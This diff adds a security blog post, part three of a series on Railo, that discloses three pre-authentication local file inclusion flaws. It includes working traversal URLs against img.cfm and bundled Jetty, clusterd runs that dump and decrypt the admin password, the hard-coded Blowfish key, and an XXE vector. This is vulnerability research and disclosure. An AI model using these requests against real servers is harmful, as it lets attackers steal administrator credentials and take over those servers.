@@ -1,0 +1,421 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>railo security - part three - pre-authentication LFI - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Part one &ndash; intro
+Part two &ndash; post-authentication rce
+Part three &ndash; pre-authentication LFI
+Part four &ndash; pre-authentication rce &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2014/08/23/railo-security-part-three">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Railo Security - Part Three - Pre-authentication LFI</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-08-23T14:00:00-07:00" pubdate data-updated="true">Aug 23<span>rd</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
+<em>Part three &ndash; pre-authentication LFI</em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>
+
+<p>This post continues our four part Railo security analysis with three pre-authentication LFI vulnerabilities.  These allow anonymous users access to retrieve the administrative plaintext password and login to the server&rsquo;s administrative interfaces.  If you&rsquo;re unfamiliar with Railo, I recommend at the very least reading part one of this series.  The most significant LFI discussed has been implemented as auxiliary modules in <a href="http://github.com/hatRiot/clusterd">clusterd</a>, though they&rsquo;re pretty trivial to exploit on their own.</p>
+
+<p>We&rsquo;ll kick this portion off by introducing a pre-authentication LFI vulnerability that affects all versions of Railo Express; if you&rsquo;re unfamiliar with the Express install, it&rsquo;s really just a self-contained, no-installation-necessary package that harnesses Jetty to host the service.   The flaw actually has nothing to do with Railo itself, but rather in this packaged web server, Jetty.  <a href="http://www.cvedetails.com/cve/CVE-2007-6672/">CVE-2007-6672</a> addresses this issue, but it appears that the Railo folks have not bothered to update this.  Via the browser, we can pull the config file, complete with the admin hash, with <code>http://[host]:8888/railo-context/admin/..\..\railo-web.xml.cfm</code>.</p>
+
+<p>A quick run of this in clusterd on Railo 4.0:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.0 --rl-pw
+</span><span class='line'>
+</span><span class='line'>        clusterd/0.3 - clustered attack toolkit
+</span><span class='line'>            [Supporting 6 platforms]
+</span><span class='line'>
+</span><span class='line'> [2014-05-15 06:25PM] Started at 2014-05-15 06:25PM
+</span><span class='line'> [2014-05-15 06:25PM] Servers' OS hinted at windows
+</span><span class='line'> [2014-05-15 06:25PM] Fingerprinting host '192.168.1.219'
+</span><span class='line'> [2014-05-15 06:25PM] Server hinted at 'railo'
+</span><span class='line'> [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server...
+</span><span class='line'> [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server Administrator...
+</span><span class='line'> [2014-05-15 06:25PM] Checking railo version 4.0 Railo Web Administrator...
+</span><span class='line'> [2014-05-15 06:25PM] Matched 3 fingerprints for service railo
+</span><span class='line'> [2014-05-15 06:25PM]   Railo Server (version 4.0)
+</span><span class='line'> [2014-05-15 06:25PM]   Railo Server Administrator (version 4.0)
+</span><span class='line'> [2014-05-15 06:25PM]   Railo Web Administrator (version 4.0)
+</span><span class='line'> [2014-05-15 06:25PM] Fingerprinting completed.
+</span><span class='line'> [2014-05-15 06:25PM] Attempting to pull password...
+</span><span class='line'> [2014-05-15 06:25PM] Fetched encrypted password, decrypting...
+</span><span class='line'> [2014-05-15 06:25PM] Decrypted password: default
+</span><span class='line'> [2014-05-15 06:25PM] Finished at 2014-05-15 06:25PM</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and on the latest release of Railo, 4.2:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.2 --rl-pw
+</span><span class='line'>
+</span><span class='line'>        clusterd/0.3 - clustered attack toolkit
+</span><span class='line'>            [Supporting 6 platforms]
+</span><span class='line'>
+</span><span class='line'> [2014-05-15 06:28PM] Started at 2014-05-15 06:28PM
+</span><span class='line'> [2014-05-15 06:28PM] Servers' OS hinted at windows
+</span><span class='line'> [2014-05-15 06:28PM] Fingerprinting host '192.168.1.219'
+</span><span class='line'> [2014-05-15 06:28PM] Server hinted at 'railo'
+</span><span class='line'> [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server...
+</span><span class='line'> [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server Administrator...
+</span><span class='line'> [2014-05-15 06:28PM] Checking railo version 4.2 Railo Web Administrator...
+</span><span class='line'> [2014-05-15 06:28PM] Matched 3 fingerprints for service railo
+</span><span class='line'> [2014-05-15 06:28PM]   Railo Server (version 4.2)
+</span><span class='line'> [2014-05-15 06:28PM]   Railo Server Administrator (version 4.2)
+</span><span class='line'> [2014-05-15 06:28PM]   Railo Web Administrator (version 4.2)
+</span><span class='line'> [2014-05-15 06:28PM] Fingerprinting completed.
+</span><span class='line'> [2014-05-15 06:28PM] Attempting to pull password...
+</span><span class='line'> [2014-05-15 06:28PM] Fetched password hash: d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b
+</span><span class='line'> [2014-05-15 06:28PM] Finished at 2014-05-15 06:28PM</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using this LFI, we can pull the <code>railo-web.xml.cfm</code> file, which contains the administrative password.  Notice that 4.2 only dumps a hash, whilst 4.0 dumps a plaintext password.  This is because versions &lt;= 4.0 blowfish encrypt the password, and > 4.0 actually hashes it.  Here&rsquo;s the relevant code from Railo (ConfigWebFactory.java):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>private static void loadRailoConfig(ConfigServerImpl configServer, ConfigImpl config, Document doc) throws IOException  {
+</span><span class='line'>        Element railoConfiguration = doc.getDocumentElement();
+</span><span class='line'>
+</span><span class='line'>        // password
+</span><span class='line'>        String hpw=railoConfiguration.getAttribute("pw");
+</span><span class='line'>        if(StringUtil.isEmpty(hpw)) {
+</span><span class='line'>            // old password type
+</span><span class='line'>            String pwEnc = railoConfiguration.getAttribute("password"); // encrypted password (reversable)
+</span><span class='line'>            if (!StringUtil.isEmpty(pwEnc)) {
+</span><span class='line'>                String pwDec = new BlowfishEasy("tpwisgh").decryptString(pwEnc);
+</span><span class='line'>                hpw=hash(pwDec);
+</span><span class='line'>            }
+</span><span class='line'>        }
+</span><span class='line'>        if(!StringUtil.isEmpty(hpw))
+</span><span class='line'>            config.setPassword(hpw);
+</span><span class='line'>        else if (configServer != null) {
+</span><span class='line'>            config.setPassword(configServer.getDefaultPassword());
+</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>As above, they actually encrypted the password using a hard-coded symmetric key; this is where versions &lt;= 4.0 stop.  In > 4.0, after decryption they hash the password (SHA256) and use it as such.  Note that the encryption/decryption is no longer the actual password in > 4.0, so we cannot simply decrypt the value to use and abuse.</p>
+
+<p>Due to the configuration of the web server, we can only pull CFM files; this is fine for the configuration file, but system files prove troublesome&hellip;</p>
+
+<p><img src="http://diyblogger.net/wp-content/uploads/2010/12/billy-mays.jpg"></p>
+
+<p>The second LFI is a trivial XXE that affects versions &lt;= 4.0, and is exploitable out-of-the-box with Metasploit.  Unlike the Jetty LFI, this affects all versions of Railo, both installed and express:</p>
+
+<p><img src="/images/posts/2014/railo/railo-xxe-msf.jpg"></p>
+
+<p>Using this we cannot pull <code>railo-web.xml.cfm</code> due to it containing XML headers, and we cannot use the standard OOB methods for retrieving files.  Timothy Morgan gave a great <a href="http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf">talk</a> at OWASP Appsec 2013 that detailed a neat way of abusing Java XML parsers to obtain RCE via XXE.  The process is pretty interesting; if you submit a URL with a jar:// protocol handler, the server will download the zip/jar to a temporary location, perform some header parsing, and then delete it.  However, if you push the file and leave the connection open, the file will persist.  This vector, combined with one of the other LFI&rsquo;s, could be a reliable pre-authentication RCE, but I was unable to get it working.</p>
+
+<p>The third LFI is just as trivial as the first two, and again stems from the pandemic problem of failing to authenticate at the URL/page level.  <code>img.cfm</code> is a file used to, you guessed it, pull images from the system for display.  Unfortunately, it fails to sanitize anything:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset path="resources/img/#attributes.src#.cfm"&gt;
+</span><span class='line'>&lt;cfparam name="application.adminimages" default="#{}#"&gt;
+</span><span class='line'>&lt;cfif StructKeyExists(application.adminimages,path) and false&gt;
+</span><span class='line'>    &lt;cfset str=application.adminimages[path]&gt;
+</span><span class='line'>&lt;cfelse&gt;
+</span><span class='line'>    &lt;cfsavecontent variable="str" trim&gt;&lt;cfinclude template="#path#"&gt;&lt;/cfsavecontent&gt;
+</span><span class='line'>    &lt;cfset application.adminimages[path]=str&gt;
+</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>By fetching this page with <code>attributes.src</code> set to another CFM file off elsewhere, we can load the file and execute any tags contained therein.  As we&rsquo;ve done above, lets grab <code>railo-web.xml.cfm</code>; we can do this with the following url: <code>http://host:8888/railo-context/admin/img.cfm?attributes.src=../../../../railo-web.xml&amp;thistag.executionmode=start</code> which simply returns</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;railo-configuration pw="d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b" version="4.2"&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This vulnerability exists in 3.3 &ndash; 4.2.1 (latest), and is exploitable out-of-the-box on both Railo installed and Express editions.  Though you can only pull CFM files, the configuration file dumps plenty of juicy information.  It may also be beneficial for custom tags, plugins, and custom applications that may house other vulnerable/sensitive information hidden away from the URL.</p>
+
+<p>Curiously, at first glance it looks like it may be possible to turn this LFI into an RFI.  Unfortunately it&rsquo;s not quite that simple; if we attempt to access a non-existent file, we see the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>The error occurred in zip://C:\Documents and Settings\bryan\My Documents\Downloads\railo\railo-express-4.2.1.000-jre-win32\webapps\ROOT\WEB-INF\railo\context\railo-context.ra!/admin/img.cfm: line 29</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Notice the <code>zip://</code> handler.  This prevents us from injecting a path to a remote host with any other handler.  If, however, the tag looked like this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfinclude&gt;#attributes.src#&lt;/cfinclude&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then it would have been trivially exploitable via RFI.  As it stands, it&rsquo;s not possible to modify the handler without prior code execution.</p>
+
+<p>To sum up the LFI&rsquo;s: all versions and all installs are vulnerable via the <code>img.cfm</code> vector.  All versions and all express editions are vulnerable via the Jetty LFI.  Versions &lt;= 4.0 and all installs are vulnerable to the XXE vector.  This gives us reliable LFI in all current versions of Railo.</p>
+
+<p>This concludes our pre-authentication LFI portion of this assessment, which will crescendo with our final post detailing several pre-authentication RCE vulnerabilities.  I expect a quick turnaround for part four, and hope to have it out in a few days.  Stay tuned!</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-08-23T14:00:00-07:00" pubdate data-updated="true">Aug 23<span>rd</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/clusterd/'>clusterd</a>, <a class='category' href='/blog/categories/railo/'>railo</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2014/08/23/railo-security-part-three/" data-via="" data-counturl="http://hatRiot.github.io/blog/2014/08/23/railo-security-part-three/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/07/24/railo-security-part-two/" title="Previous Post: railo security - part two - post-authentication rce">&laquo; railo security - part two - post-authentication rce</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/08/27/railo-security-part-four/" title="Next Post: railo security - part four - pre-auth remote code execution">railo security - part four - pre-auth remote code execution &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
